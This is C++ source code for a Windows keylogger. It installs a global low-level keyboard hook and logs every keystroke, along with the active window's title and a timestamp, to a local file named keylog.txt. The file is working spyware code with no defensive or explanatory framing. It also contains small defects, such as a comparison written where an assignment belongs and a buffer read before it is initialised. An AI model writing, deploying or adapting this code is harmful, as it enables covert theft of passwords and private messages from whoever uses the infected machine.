#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>
#include <wchar.h>

#pragma warning(disable:4996)
#pragma warning(disable:4703)
using namespace std;

int save(int key);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

KBDLLHOOKSTRUCT kbStruct;

ofstream file;

int save(int key) {
	wchar_t prevProg[256];
	if (key == 1 || key == 2) {
		return 0;
	}

	HWND foreground = GetForegroundWindow();

	DWORD threadId;

	HKL keyboardLayout;
	if (foreground) {

		threadId = GetWindowThreadProcessId(foreground, NULL);

		keyboardLayout = GetKeyboardLayout(threadId);

		wchar_t crrProg[256];

		GetWindowText(foreground, crrProg, 256);

		std::cout << crrProg << std::endl;;
		std::cout << prevProg<<std::endl;
		if (wcscmp(crrProg, prevProg) != 0)
		{
			wcscpy_s(prevProg, crrProg);

			time_t t = time(NULL);

			struct tm* tm = localtime(&t);

			char c[64];

			strftime(c, sizeof(c), "%c", tm);

			file << "\n\n\n[Program: " << crrProg << " DateTime: " << c << "]";
		}
	}

	cout << key << endl;

	if (key == VK_BACK) file << "BACKSPACE";
	else if (key == VK_RETURN) file << "\n";
	else if (key == VK_SPACE) file << " ";
	else if (key == VK_TAB) file << "[TAB]";
	else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) file << "[SHIFT]";
	else if (key == VK_TAB || key == VK_LCONTROL || key == VK_RCONTROL) file << "[CTRL]";
	else if (key == VK_ESCAPE) file << "[ESCAPE]";
	else if (key == VK_END) file << "[END]";
	else if (key == VK_HOME) file << "[HOME]";
	else if (key == VK_LEFT) file << "[LEFT]";
	else if (key == VK_RIGHT) file << "[RIGHT]";
	else if (key == VK_UP) file << "[UP]";
	else if (key == VK_DOWN) file << "[DOWN]";
	else if (key == 190 || key == 110) file << ".";
	else if (key == 189 || key == 109) file << "-";
	else if (key == 20) file << "[CAPS]";
	else {
		char crrKey;

		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0); // caps pushed

		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
			(GetKeyState(VK_RSHIFT) & 0x1000) != 0 ||
			(GetKeyState(VK_LSHIFT) & 0x1000) != 0)
		{
			lower = !lower;
		}

		crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);

		if (!lower) {
			crrKey = tolower(crrKey);
		}

		file << char(crrKey);

	}

	file.flush();
	return 0;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) 
{
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);

			save(kbStruct.vkCode);
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}


int main() {
	file.open("keylog.txt", ios_base::app);

	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);

	hook == SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);

	MSG message;
	while (true) {
		GetMessage(&message, NULL, 0, 0);
	}
}